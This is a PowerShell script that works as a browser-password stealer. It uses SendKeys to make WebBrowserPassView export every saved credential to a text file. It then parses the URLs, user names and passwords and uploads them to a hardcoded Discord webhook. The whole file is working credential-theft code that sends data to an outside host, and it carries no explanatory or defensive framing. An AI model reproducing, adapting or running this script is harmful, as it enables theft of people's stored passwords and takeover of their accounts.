$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"

$wshell = New-Object -ComObject wscript.shell;
$wshell.AppActivate('WebBrowserPassView')
Sleep 1
$wshell.SendKeys("^{a}")
Sleep 1
$wshell.SendKeys("^{s}")
Sleep 1
$wshell.SendKeys("pwds.txt")
Sleep 1
$wshell.SendKeys("~")
Sleep 2

# Path to your file
$filePath = "pwds.txt"

# Read the file content
$fileContent = Get-Content $filePath

# Initialize variables
$entries = @()
$currentEntry = @{}

# Loop through each line of the file
# Loop through each line of the file
foreach ($line in $fileContent) {
    if ($line -match 'URL\s*:\s*(.+)') {
        # Capture the URL
        $currentEntry.URL = $matches[1].Trim()
    } elseif ($line -match 'User Name\s*:\s*(.+)') {
        # Capture the User Name
        $currentEntry.UserName = $matches[1].Trim()
    } elseif ($line -match 'Password\s*:\s*(.+)') {
        # Capture the Password
        $currentEntry.Password = $matches[1].Trim()
    } elseif ($line -match '^\s*={3,}') {
        # Separator line, meaning the end of one entry
        if ($currentEntry.URL) {
            # Ensure that User Name and Password are defined, even if empty
            $currentEntry.UserName = if ($currentEntry.UserName) { $currentEntry.UserName } else { "" }
            $currentEntry.Password = if ($currentEntry.Password) { $currentEntry.Password } else { "" }
            
            # Add the current entry to the list of entries
            $entries += $currentEntry
            $currentEntry = @{} # Reset for next entry
        }
    }
}

# Ensure the last entry is added in case the file ends without a separator
if ($currentEntry.URL) {
    $currentEntry.UserName = if ($currentEntry.UserName) { $currentEntry.UserName } else { "" }
    $currentEntry.Password = if ($currentEntry.Password) { $currentEntry.Password } else { "" }
    $entries += $currentEntry
}

# Format the extracted data for sending
$discordMessage = ""
foreach ($entry in $entries) {
    $discordMessage += "`nURL: $($entry.URL)`nUser Name: $($entry.UserName)`nPassword: $($entry.Password)`n"
}

# Truncate if content exceeds Discord's 2000 character limit
if ($discordMessage.Length -gt 2000) {
    Write-Host "Content exceeds the 2000 character limit, truncating..."
    $discordMessage = $discordMessage.Substring(0, 2000)
}

# Discord Webhook URL
$URL = "https://discord.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"

# Prepare JSON payload
$msg = @{
    content = $discordMessage
} | ConvertTo-Json

# Send the message to Discord Webhook with error handling
try {
    Invoke-RestMethod -Uri $URL -Method Post -Body $msg -ContentType "application/json" -ErrorAction Stop | Out-Null
    Write-Host "Message sent successfully!"
} catch {
    Write-Host "Error sending webhook: $_"
}
